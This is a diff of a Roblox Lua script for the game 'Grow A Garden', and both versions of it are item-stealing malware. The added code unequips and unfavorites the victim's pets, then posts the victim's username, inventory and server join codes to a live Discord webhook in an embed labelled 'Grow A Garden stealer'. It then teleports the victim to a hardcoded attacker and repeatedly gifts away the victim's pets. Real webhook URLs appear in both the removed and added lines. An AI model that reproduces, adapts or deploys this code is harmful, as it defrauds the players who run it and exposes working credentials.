@@ -1,131 +1,126 @@
-getgenv().Webhook = "https://discord.com/api/webhooks/1393571947840929813/Yk-SBXIZoh-FP02pfhIfxthDSYJvUiIxbqugybWYu_gMi0XaccmE3E_1vjcMwZaBpJRM"
-getgenv().Username = "PUT_HERE_UR_USERNAME"
+if shared.GAGInjected then return end
+shared.GAGInjected = true
 
-local RS = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
-local TeleportService = game:GetService("TeleportService")
-local DataService = require(RS.Modules.DataService)
-local PetRegistry = require(RS.Data.PetRegistry)
-local NumberUtil = require(RS.Modules.NumberUtil)
-local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
-local PetsService = require(RS.Modules.PetServices.PetsService)
+local ATTACKER = "USERNAME_HERE"
+local WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
+local IMPORTANT = {"Raccoon","Dragonfly","Red Fox","Queen Bee","Chicken Zombie","Candy Blossom","Kitsune","French Fly Ferret"}
+local IGNORED = {"Can","Shovel","Seed","Wrench","Sprinkler","Rod","Tool","Staff","Trowel"}
 
-local data = DataService:GetData()
-local maxAttempts = 10
-local attempt = 1
-local teleported = false
-
-if getgenv().EclipseHubRunning then
-    warn("Script is already running or has been executed! Cannot run again.")
-    return
-end
-getgenv().EclipseHubRunning = true
-
-local PetPriorityData = {
-    ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
-    ["Raccoon"] = { priority = 2, emoji = "🦝", isMutation = false },
-    ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
-    ["Fennec fox"] = { priority = 4, emoji = "🦊", isMutation = false },
-    ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
-    ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
-    ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
-    ["Corrupted Kitsune"] = { priority = 8, emoji = "🦊", isMutation = false },
-    ["T-Rex"] = { priority = 9, emoji = "🦖", isMutation = false },
-    ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
-    ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
-    ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
-    ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
-    ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
-    ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
-    ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
-    ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
-    ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
-    ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
-    ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
-    ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
-    ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
-    ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
-    ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
-    ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
-    ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
-}
-
-local function formatNumberWithCommas(n)
-    local str = tostring(n)
-    return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
-end
-
-local function getWeight(toolName)
-    if not toolName or toolName == "No Tool" then return nil end
-    local weight = toolName:match("%[([%d%.]+) KG%]")
-    return weight and tonumber(weight)
-end
-
-local function getAge(toolName)
-    if not toolName or toolName == "No Tool" then return nil end
-    local age = toolName:match("%[Age (%d+)%]")
-    return age and tonumber(age)
-end
-
-local function GetPlayerPets()
-    local unsortedPets = {}
-    local player = Players.LocalPlayer
-    
-    if not data or not data.PetsData then
-        warn("No pet data available")
-        return unsortedPets
-    end
-
-    for _, tool in pairs(player.Backpack:GetChildren()) do
-        if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
-            local petName = tool.Name
-            if petName:find("Bald Eagle") or petName:find("Golden Lab") then continue end
-
-            local age = getAge(tool.Name) or 0
-            local weight = getWeight(tool.Name) or 0
-            local strippedName = petName:gsub(" %[.*%]", "")
-            
-            table.insert(unsortedPets, {
-                PetName = petName,
-                PetAge = age,
-                PetWeight = weight,
-                Id = tool:GetAttribute("PET_UUID"),
-                Type = strippedName,
-                Value = 0,
-                Formatted = "0"
-            })
+for _,pet in pairs(workspace.PetsPhysical:GetChildren()) do
+    if pet:GetAttribute("OWNER") == game.Players.LocalPlayer.Name then
+        for _,v in pairs(pet:GetChildren()) do
+            if v:IsA("Tool") then
+                game:GetService("ReplicatedStorage").GameEvents.PetsService:FireServer("UnequipPet",v.Name)
+            end
         end
     end
-    return unsortedPets
 end
 
-local pets = GetPlayerPets()
-
-local function CreateGui()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "EclipseHubGui"
-    gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
-    
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-    bg.Parent = gui
-    
-    local spinner = Instance.new("ImageLabel")
-    spinner.Size = UDim2.new(0.2, 0, 0.2, 0)
-    spinner.Position = UDim2.new(0.4, 0, 0.3, 0)
-    spinner.Image = "rbxassetid://74011233271790"
-    spinner.Parent = bg
-    
-    local title = Instance.new("TextLabel")
-    title.Text = "Please wait..."
-    title.Size = UDim2.new(1, 0, 0.1, 0)
-    title.Position = UDim2.new(0, 0, 0.5, 0)
-    title.Parent = bg
-    
-    return gui
+for _,tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+    if tool:IsA("Tool") and tool:GetAttribute("d") == true then
+        game:GetService("ReplicatedStorage").GameEvents.Favorite_Item:FireServer(tool)
+    end
 end
 
-local gui = CreateGui()
+local items = {}
+local importantItems = {}
+
+for _,item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+    if item:IsA("Tool") then
+        local isImportant = false
+        for _,v in ipairs(IMPORTANT) do
+            if string.find(string.lower(item.Name), string.lower(v)) then
+                table.insert(importantItems, item.Name)
+                isImportant = true
+                break
+            end
+        end
+        if not isImportant then
+            local shouldIgnore = false
+            for _,v in ipairs(IGNORED) do
+                if string.find(string.lower(item.Name), string.lower(v)) then
+                    shouldIgnore = true
+                    break
+                end
+            end
+            if not shouldIgnore then
+                table.insert(items, item.Name)
+            end
+        end
+    end
+end
+
+local ping = #importantItems > 0 and "@everyone " or ""
+local placeId = game.PlaceId
+local jobId = game.JobId
+local teleportCode = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
+local consoleCode = string.format('Roblox.GameLauncher.joinGameInstance(%s, "%s")', placeId, jobId)
+local joinLink = string.format("roblox://placeID=%s&gameInstanceID=%s", placeId, jobId)
+
+local request = syn and syn.request or http_request or request
+if request then
+    pcall(function()
+        request({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode({
+                ["content"] = ping..teleportCode,
+                ["embeds"] = {{
+                    ["title"] = "Join to get Grow A Garden hit",
+                    ["color"] = 65280,
+                    ["fields"] = {
+                        {["name"] = "Victim Username:", ["value"] = game.Players.LocalPlayer.Name},
+                        {["name"] = "Items:", ["value"] = #items > 0 and table.concat(items, ", ") or "None"},
+                        {["name"] = "Important Items:", ["value"] = #importantItems > 0 and table.concat(importantItems, ", ") or "None"},
+                        {["name"] = "Join from console:", ["value"] = consoleCode},
+                        {["name"] = "Join from link:", ["value"] = joinLink}
+                    },
+                    ["footer"] = {["text"] = "Grow A Garden stealer"},
+                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                }}
+            })
+        })
+    end)
+end
+
+while task.wait(0.5) do
+    local target = game.Players:FindFirstChild(ATTACKER)
+    if target and target.Character then
+        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
+        end
+        
+        for _,item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                local isImportant = false
+                for _,v in ipairs(IMPORTANT) do
+                    if string.find(string.lower(item.Name), string.lower(v)) then
+                        isImportant = true
+                        break
+                    end
+                end
+                
+                local shouldIgnore = false
+                for _,v in ipairs(IGNORED) do
+                    if string.find(string.lower(item.Name), string.lower(v)) then
+                        shouldIgnore = true
+                        break
+                    end
+                end
+                
+                if not shouldIgnore then
+                    item.Parent = game.Players.LocalPlayer.Character
+                    task.wait(0.2)
+                    game:GetService("ReplicatedStorage").GameEvents.PetGiftingService:FireServer("GivePet", target)
+                    task.wait(0.2)
+                    if item.Parent == game.Players.LocalPlayer.Character then
+                        item.Parent = game.Players.LocalPlayer.Backpack
+                    end
+                end
+            end
+        end
+    end
+end
